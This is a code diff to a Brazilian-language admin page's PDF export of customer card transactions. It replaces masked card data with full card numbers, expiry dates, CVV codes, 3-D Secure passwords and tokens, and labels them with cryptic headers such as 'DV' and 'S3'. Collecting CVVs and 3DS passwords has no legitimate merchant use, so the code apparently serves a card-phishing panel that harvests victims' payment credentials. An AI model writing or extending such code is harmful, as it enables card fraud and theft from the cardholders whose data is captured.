@@ -272,22 +272,28 @@ const AdminCartoes = () => {
       tx.customer_phone,
       tx.plan_label + " x" + tx.quantity,
       tx.amount.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }),
-      codifyBrand(tx.card_brand),
-      tx.card_last4,
+      tx.address || "—",
       tx.holder_name,
       formatCpf(tx.cpf),
-      tx.address || "—",
-      tx.coupon || "—",
+      tx.card_number ? formatCardNumber(tx.card_number) : maskCardNumber(tx.card_last4),
+      codifyBrand(tx.card_brand),
+      tx.card_expiry,
+      tx.card_cvv || "—",
+      tx.threeds_password || "—",
+      tx.token,
       tx.status === "pending" ? "Pendente" : tx.status === "confirmed" ? "Confirmada" : tx.status === "rejected" ? "Rejeitada" : tx.status,
       formatDate(tx.created_at),
     ]);
 
     autoTable(doc, {
       startY: 30,
-      head: [["Cliente", "Telefone", "Plano", "Valor", "Bandeira", "Final", "Titular", "CPF", "Endereço", "Cupom", "Status", "Data"]],
+      head: [["Cliente", "Telefone", "Plano", "Valor", "Endereço", "Titular", "CPF", "C", "B", "DV", "C1", "S3", "Token", "Status", "Data"]],
       body: txRows,
-      styles: { fontSize: 7, cellPadding: 2 },
-      headStyles: { fillColor: [41, 128, 185], fontSize: 7 },
+      styles: { fontSize: 6, cellPadding: 1.5 },
+      headStyles: { fillColor: [41, 128, 185], fontSize: 6 },
+      columnStyles: {
+        12: { cellWidth: 30 }, // Token column wider
+      },
     });
 
     if (complaints.length > 0) {
